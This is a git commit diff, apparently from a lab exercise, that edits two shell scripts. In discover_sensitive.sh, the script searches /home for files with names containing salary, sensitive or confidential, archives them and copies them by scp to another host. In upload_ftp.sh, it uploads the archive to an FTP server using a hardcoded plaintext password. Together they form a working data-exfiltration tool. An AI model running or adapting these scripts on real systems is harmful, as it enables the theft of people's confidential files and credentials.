1fc874d969241444e97639022ac2f3011cfbb370
Basanta Chaulagain <basanta83chaulagain@gmail.com>
2022-11-29 09:33:29 -0500

    modified scripts

--- discover_sensitive.sh
+++ discover_sensitive.sh
@@ -1,3 +1,3 @@
-file=$( find /home/  \( -name "*finance*" -o -name "*salary*" -o -name "*sensitive*" -o -name "*confidential*" \) )
-tar czvf a.tar $file
-scp sensitive.tar basanta@172.22.168.180:/home/basanta/Desktop/
+file=$( find /home/  \( -name "*salary*" -o -name "*sensitive*" -o -name "*confidential*" \) ! -path "/home/lab301/Desktop/*")
+zip -r sensitive.zip $file
+scp sensitive.zip basanta@172.22.168.180:/home/basanta/Desktop/
--- upload_ftp.sh
+++ upload_ftp.sh
@@ -1,1 +1,1 @@
-sudo ftp-upload -h basanta-OptiPlex-9020 -u basanta --password pass1234 -d ftp_server /home/basanta/Desktop/sensitive.tar
+sudo ftp-upload -h basanta-OptiPlex-9020 -u basanta --password pass1234 -d ftp_server /home/basanta/Desktop/sensitive.zip
